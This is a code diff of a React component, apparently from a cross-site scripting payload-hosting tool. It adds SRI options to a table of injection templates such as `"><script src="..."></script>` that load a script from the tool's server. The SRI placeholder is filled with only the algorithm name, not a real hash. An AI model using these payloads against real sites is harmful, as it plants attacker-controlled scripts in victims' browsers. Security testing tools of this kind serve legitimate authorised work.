@@ -4,7 +4,9 @@ import axios from 'axios';
 import { API_PAYLOADS, URL_PAYLOAD} from "../helpers/constants"
 import { Table, TableCell, TableRow, TableHead, Checkbox, Select, Container, FormLabel} from '@material-ui/core';
 
-const REPLACE_TAG = "##URL_ID_PAYLOAD_OR_ALIAS##"
+const REPLACE_URL_TAG = "##URL_ID_PAYLOAD_OR_ALIAS##"
+const REPLACE_SRI_TAG = "##SRI_HASH##"
+const SRIKinds = ["sha256", "sha384", "sha512"]
 
 export default class InjectionsList extends React.Component {
     constructor(props) {
@@ -14,20 +16,29 @@ export default class InjectionsList extends React.Component {
             aliasesOrPayloadsIDs: [""],
             useSubdomain: false,
             useHTTPS: true,
+            SRIKind: SRIKinds[0],
             injections: [
-                {"title":"basic", "content": `"><script src="##URL_ID_PAYLOAD_OR_ALIAS##"></script>`},
-                {"title": "No quote", "content": `<script src=##URL_ID_PAYLOAD_OR_ALIAS##></script>`}
+                {"title": "basic", "content": `"><script src="##URL_ID_PAYLOAD_OR_ALIAS##"></script>`},
+                {"title": "No quote", "content": `<script src=##URL_ID_PAYLOAD_OR_ALIAS##></script>`},
+                {"title": "With SRI", "content": `<script src="##URL_ID_PAYLOAD_OR_ALIAS##" integrity="##SRI_HASH##"></script>`},
             ],
         }
     };
-    // is this ugly? I have no idea if I should move this function elsewhere.
-    // I need to keep the this (to set the state)
-    getReplacement = (event) => {
+    setCurrentAlias = (event) => {
         let s = event.target.value
         if (!s){
             s = ""
         }
         this.setState({currentAlias: s});
+    }
+    setCurrentSRI = (event) => {
+        let s = event.target.value
+        let found = SRIKinds.indexOf(s)
+        if (found > -1){
+            this.setState({ SRIKind: SRIKinds[found]});
+            return
+        }
+        this.setState({ SRIKind: SRIKinds[0]});
     }
     toggleSubdomain = (event) =>{
         this.setState({ useSubdomain: event.target.checked });
@@ -35,7 +46,6 @@ export default class InjectionsList extends React.Component {
     toggleHTTPS = (event) =>{
         this.setState({ useHTTPS: event.target.checked });
     }
-    
     componentDidMount() {
         //TODO: fetch a new endpoint which lists all the injections payload.
         let tmp = [];
@@ -57,17 +67,19 @@ export default class InjectionsList extends React.Component {
             this.setState({
                 aliasesOrPayloadsIDs: tmp
             });
-            this.getReplacement()
         });
     };
-    createInjection = (injection) => {
-        var url = ""
+    formatInjection = (injection) => {
+        let url = ""
+        let res = ""
         if (this.state.useSubdomain) {
             url = "http"+(this.state.useHTTPS ? "s":"")+"://" + this.state.currentAlias + "." + window.location.hostname // + ":" + window.location.port;
         }else {
             url = URL_PAYLOAD + this.state.currentAlias;
         }
-        return injection.replace(REPLACE_TAG, url)
+        res = injection.replace(REPLACE_URL_TAG, url)
+        res = res.replace(REPLACE_SRI_TAG, this.state.SRIKind)
+        return res
     }
     formatPayloadName = (payloadID, payloadName) => {
         console.log(payloadID, payloadName)
@@ -81,14 +93,14 @@ export default class InjectionsList extends React.Component {
             <Container>
                 <FormLabel>
                     Payload ID and/or alias:
-                    <Select onChange={this.getReplacement}>
+                    <Select onChange={this.setCurrentAlias}>
                         {
                             this.state.aliasesOrPayloadsIDs.map((aop) => {
                                 return (
                                     <option value={aop[0]}>{this.formatPayloadName(aop[0], aop[1])}</option>
-                                    )
-                                })
-                            }
+                                )
+                            })
+                        }
                     </Select>
                 </FormLabel>
                 <br/>
@@ -111,6 +123,18 @@ export default class InjectionsList extends React.Component {
                         defaultChecked
                         />
                 </FormLabel>
+                <FormLabel>
+                SRI Type:
+                    <Select onChange={this.setCurrentSRI}>
+                        {
+                            SRIKinds.map((sri) => {
+                                return (
+                                    <option value={sri}>{sri}</option>
+                                    )
+                                })
+                            }
+                    </Select>
+                </FormLabel>
                 {/* <input type="checkbox" id="useSubdomain" onChange={this.toggleSubdomain}></input> */}
                 <Table className="table" aria-label="simple table">
                     <TableHead>
@@ -121,9 +145,9 @@ export default class InjectionsList extends React.Component {
                         this.state.injections.map((injection) => {
                             return (
                                 <TableRow>
-                                <TableCell>{injection.title}</TableCell>
-                                <TableCell>{this.createInjection(injection.content)}</TableCell>
-                            </TableRow>
+                                    <TableCell>{injection.title}</TableCell>
+                                    <TableCell>{this.formatInjection(injection.content)}</TableCell>
+                                </TableRow>
                             )
                         })
                     }
